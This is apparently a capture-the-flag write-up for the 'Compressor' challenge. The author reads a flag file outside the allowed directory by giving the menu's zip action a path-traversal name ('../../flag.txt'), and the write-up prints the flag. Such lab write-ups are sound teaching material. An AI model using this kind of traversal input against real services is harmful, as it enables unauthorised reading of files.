# Misc 1: Compressor
> Ramona's obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang's ownership called "Compressor", which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?


#### Difficulty: ★☆☆☆

As there are no downloadable elements, I spun up the Docker image to start the challenge. I then connected to it via netcat, where I was presented with a menu:

```
[*] Directory to work in: V7lTDhNr4q059xYaUdjwcsuXjhO3VLug

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component:

```


Choosing any component takes us to a subdirectory named after that component and a few actions:


```
[*] Sub-directory to work in: V7lTDhNr4q059xYaUdjwcsuXjhO3VLug/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action:
```

Looks like they listed precisely which commands will be executed per action. I keyed in action 2 to figure out the paths:

```
[*] Choose action: 2
/home/ctf/V7lTDhNr4q059xYaUdjwcsuXjhO3VLug/Head
total 8
drwxr-sr-x    2 ctf      ctf           4096 May 17 02:18 .
drwxr-sr-x    6 ctf      ctf           4096 May 17 02:18 ..



Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action:
```

Based on the commands they listed on action 4, there is nothing stopping me from adding a file from outside the current directory, which I did with the path from `pwd` as my reference point.

```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 4


Insert <name>.zip: hehe
Insert <name>: ../../flag.txt
Insert <options>:
  adding: ../../flag.txt (stored 0%)
```

Looks like the flag was successfully added, so I used action 3 to read the contents of the zip:


```
Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: hehe.zip
PK
���Txl��&&../../flag.txtUT     �E}b�E}bux
                                           HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}
PK
���Txl��&&��../../flag.txtUT�E}bux
                                      PKTn
```


which gave me the flag

`HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}`
